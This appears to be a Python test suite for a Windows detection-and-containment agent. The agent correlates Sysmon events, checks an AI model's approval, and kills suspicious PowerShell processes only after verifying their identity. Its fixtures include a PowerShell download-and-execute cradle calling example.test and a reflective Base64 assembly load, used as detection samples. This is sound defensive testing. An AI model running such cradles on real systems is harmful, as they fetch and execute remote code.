import json
import tempfile
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path
from unittest.mock import patch

from agent.autostart import QueueDB, load_config
from agent.guarded_containment import (eligible_evidence, high_risk_command,
                                       policy_approves, terminate_verified)
from Sensor.event_listener import parse_sysmon_event

NOW = datetime(2026, 11, 7, 16, 10, tzinfo=timezone.utc)
CREATED = NOW - timedelta(seconds=15)
START = CREATED.isoformat()
IMAGE = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
USERNAME = r'DESKTOP-TEST\student'
GUID = '{FAKE-PROCESS-GUID}'


def event_one(**updates):
    payload = {
        'event_id': 1, 'record_id': '1000', 'pid': 5412,
        'image': IMAGE, 'user': USERNAME, 'process_guid': GUID,
        'event_time_utc': START,
        'command_line': r'powershell -nop -c "iex (New-Object Net.WebClient).DownloadString(\'https://example.test/a\')"',
        'cleaned_command': "iex (New-Object Net.WebClient).DownloadString('https://example.test/a')",
    }
    payload.update(updates)
    return payload


def event_11(**updates):
    payload = {
        'event_id': 11, 'record_id': '1001', 'process_guid': GUID,
        'event_time_utc': (CREATED + timedelta(seconds=2)).isoformat(),
        'event_data': {'TargetFilename': r'C:\Users\student\AppData\Local\Temp\probe.ps1'},
        'image': IMAGE,
    }
    payload.update(updates)
    return payload


class TestCorrelation(unittest.TestCase):
    def test_independent_evidence_required(self):
        self.assertEqual(eligible_evidence(event_one(), [], NOW)[1],
                         'INSUFFICIENT_INDEPENDENT_EVIDENCE')

    def test_high_risk_classifier_does_not_accept_plain_obfuscation(self):
        self.assertFalse(high_risk_command("powershell.exe -EncodedCommand aAAA"))
        self.assertTrue(high_risk_command("iex (New-Object Net.WebClient).DownloadString('https://example.test/x')"))
        self.assertTrue(high_risk_command("[Reflection.Assembly]::Load([Convert]::FromBase64String($b))"))

    def test_harmless_encoded_command_no_kill(self):
        case = event_one(cleaned_command="Write-Output 'DACN_TEST'")
        self.assertEqual(eligible_evidence(case, [event_11()], NOW)[1], 'NO_HIGH_RISK_COMMAND')

    def test_matching_risky_file_event_qualifies(self):
        allowed, reason, rows = eligible_evidence(event_one(), [event_11()], NOW)
        self.assertTrue(allowed)
        self.assertEqual(reason, 'CORRELATED')
        self.assertEqual(len(rows), 1)

    def test_wrong_guid_never_qualifies(self):
        self.assertFalse(eligible_evidence(event_one(), [event_11(process_guid='{OTHER}')], NOW)[0])

    def test_stale_creation_never_qualifies(self):
        c = event_one(event_time_utc=(NOW-timedelta(seconds=400)).isoformat())
        self.assertEqual(eligible_evidence(c, [event_11()], NOW)[1], 'STALE_EVENT')

    def test_unrelated_file_is_not_independent_corrob(self):
        file = event_11(event_data={'TargetFilename': r'C:\Windows\Temp\innocent.txt'})
        self.assertFalse(eligible_evidence(event_one(), [file], NOW)[0])

    def test_unrelated_registry_is_not_corrob(self):
        reg = event_11(event_id=13, event_data={'TargetObject':r'HKCU\Software\Acme\Demo'})
        self.assertFalse(eligible_evidence(event_one(), [reg], NOW)[0])

    def test_nonmatching_time_is_not_corrob(self):
        ev = event_11(event_time_utc=(CREATED+timedelta(seconds=200)).isoformat())
        self.assertFalse(eligible_evidence(event_one(), [ev], NOW)[0])

    def test_requires_ai_approval(self):
        self.assertFalse(policy_approves({'is_threat': True, 'action': 'KILL_PROCESS', 'severity': 'MEDIUM'}))
        self.assertFalse(policy_approves({'is_threat': False, 'action': 'KILL_PROCESS', 'severity': 'HIGH'}))
        self.assertTrue(policy_approves({'is_threat': True, 'action': 'KILL_PROCESS', 'severity': 'HIGH'}))


class FakeProcess:
    def __init__(self, pid, *, exe=IMAGE, username=USERNAME, create=None, alive=True):
        self.pid = pid
        self._exe = exe
        self._username = username
        self._create = create if create is not None else CREATED.timestamp()
        self._alive = alive
        self.kill_calls = 0

    def exe(self): return self._exe
    def username(self): return self._username
    def create_time(self): return self._create
    def is_running(self): return self._alive
    def kill(self): self.kill_calls += 1
    def wait(self, timeout): self._alive = False


class TestProcessIdentity(unittest.TestCase):
    def test_verified_kill_and_post_verify(self):
        proc = FakeProcess(5412)
        result = terminate_verified(event_one(), now=NOW, process_factory=lambda _: proc)
        self.assertEqual(result['executed_action'], 'KILL_PROCESS')
        self.assertEqual(result['response_reason'], 'POST_VERIFY_OK')
        self.assertEqual(proc.kill_calls, 1)

    def test_deny_pid_reuse(self):
        proc = FakeProcess(5412, create=CREATED.timestamp()+80)
        result = terminate_verified(event_one(), now=NOW, process_factory=lambda _: proc)
        self.assertEqual(result['response_reason'], 'PID_REUSED_OR_TIME_MISMATCH')
        self.assertEqual(proc.kill_calls, 0)

    def test_deny_wrong_path(self):
        proc = FakeProcess(5412, exe=r'C:\Other\powershell.exe')
        result = terminate_verified(event_one(), now=NOW, process_factory=lambda _: proc)
        self.assertEqual(result['response_reason'], 'IDENTITY_MISMATCH')
        self.assertEqual(proc.kill_calls, 0)

    def test_deny_system_account(self):
        proc = FakeProcess(5412, username=r'NT AUTHORITY\SYSTEM')
        result = terminate_verified(event_one(user=r'NT AUTHORITY\SYSTEM'), now=NOW, process_factory=lambda _: proc)
        self.assertEqual(result['response_reason'], 'PROTECTED_IDENTITY')
        self.assertEqual(proc.kill_calls, 0)

    def test_deny_non_running(self):
        proc = FakeProcess(5412, alive=False)
        result = terminate_verified(event_one(), now=NOW, process_factory=lambda _: proc)
        self.assertEqual(result['response_reason'], 'NOT_RUNNING')
        self.assertEqual(proc.kill_calls, 0)

    def test_deny_stale_pid(self):
        proc = FakeProcess(5412)
        result = terminate_verified(event_one(), now=NOW+timedelta(seconds=200), process_factory=lambda _: proc)
        self.assertEqual(result['response_reason'], 'STALE_EVENT')
        self.assertEqual(proc.kill_calls, 0)


class TestStorageAndConfig(unittest.TestCase):
    def test_queue_eid1_and_eid11_correlate(self):
        with tempfile.TemporaryDirectory() as folder:
            db = QueueDB(Path(folder) / 'queue.db')
            db.put(event_one())
            db.done(1000)
            db.put(event_11())
            creation, related = db.get_creation_and_related(GUID.lower())
            self.assertEqual(creation['pid'], 5412)
            self.assertEqual([item['event_id'] for item in related], [11])

    def test_queue_migrates_existing_db(self):
        import sqlite3
        with tempfile.TemporaryDirectory() as folder:
            path = Path(folder) / 'queue.db'
            with sqlite3.connect(str(path)) as connection:
                connection.execute("CREATE TABLE events (record_id INTEGER PRIMARY KEY, payload TEXT NOT NULL, status TEXT NOT NULL DEFAULT 'pending', attempts INTEGER NOT NULL DEFAULT 0, updated_utc TEXT NOT NULL)")
                connection.execute('INSERT INTO events(record_id,payload,updated_utc) VALUES(?,?,?)',
                                   (1000,json.dumps(event_one()),START))
            db = QueueDB(path)
            creation, related = db.get_creation_and_related(GUID.lower())
            self.assertEqual(creation['record_id'], '1000')

    def test_guarded_mode_explicit_valid(self):
        with tempfile.TemporaryDirectory() as folder:
            path=Path(folder)/'agent.json'
            path.write_text(json.dumps({'ai_endpoint':'http://192.168.62.1:1236/v1','model':'qwen2.5-coder-3b-instruct-awq','response_mode':'GUARDED_AUTO'}))
            self.assertEqual(load_config(path)['response_mode'], 'GUARDED_AUTO')

    def test_parser_collects_file_evidence(self):
        xml=f'''<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>11</EventID><EventRecordID>101</EventRecordID><TimeCreated SystemTime="{START}" /></System><EventData><Data Name="ProcessGuid">{GUID}</Data><Data Name="Image">{IMAGE}</Data><Data Name="TargetFilename">C:\\Windows\\Temp\\bad.ps1</Data></EventData></Event>'''
        parsed=parse_sysmon_event(xml)
        self.assertEqual(parsed['event_id'],11)
        self.assertIn('TargetFilename',parsed['event_data'])
        self.assertEqual(parsed['process_guid'], GUID)


if __name__ == '__main__': unittest.main()

class TestWorkerEndToEnd(unittest.TestCase):
    def _run_pipeline(self, mode):
        import threading
        from agent.autostart import worker_loop
        now = datetime.now(timezone.utc) - timedelta(seconds=8)
        created = event_one(event_time_utc=now.isoformat())
        related = event_11(event_time_utc=(now + timedelta(seconds=2)).isoformat())
        with tempfile.TemporaryDirectory() as folder:
            folder = Path(folder)
            db = QueueDB(folder / 'db.sqlite3')
            db.put(created)
            db.put(related)
            stop = threading.Event()
            invoked = []

            class FakeAI:
                def __init__(self, **kw): pass
                def phan_tich_su_kien(self, processed):
                    if processed.get('corroborating_events'):
                        stop.set()
                        return {'is_threat': True, 'severity': 'HIGH', 'action': 'KILL_PROCESS'}
                    return {'is_threat': False, 'severity': 'LOW', 'action': 'LOG_ONLY'}

            def fake_terminate(process):
                invoked.append(process)
                return {'executed_action': 'KILL_PROCESS', 'response_reason': 'POST_VERIFY_OK'}

            config = {'ai_endpoint':'http://127.0.0.1:1236/v1',
                      'model':'test', 'response_mode':mode, 'retry_seconds':2}
            with patch('agent.bo_nao_ai.BoNaoAIAgent', FakeAI), patch('agent.guarded_containment.terminate_verified', fake_terminate):
                thread = threading.Thread(target=worker_loop, args=(db, config, folder, stop), daemon=True)
                thread.start()
                thread.join(timeout=4)
                stop.set()
                thread.join(timeout=2)
            self.assertFalse(thread.is_alive())
            logs = [json.loads(x) for x in (folder/'decision_audit.jsonl').read_text().splitlines()]
            return invoked, logs, db.count_pending()

    def test_guarded_calls_terminate_verified(self):
        invoked, logs, pending = self._run_pipeline('GUARDED_AUTO')
        self.assertEqual(len(invoked), 1)
        self.assertEqual(logs[-1]['executed_action'], 'KILL_PROCESS')
        self.assertEqual(logs[-1]['response_reason'], 'POST_VERIFY_OK')
        self.assertEqual(pending, 0)

    def test_simulation_never_invokes_terminate(self):
        invoked, logs, pending = self._run_pipeline('SIMULATION_ONLY')
        self.assertEqual(len(invoked), 0)
        self.assertEqual(logs[-1]['executed_action'], 'NONE')
        self.assertEqual(logs[-1]['response_reason'], 'SIMULATED_POLICY_APPROVAL')
        self.assertEqual(pending, 0)
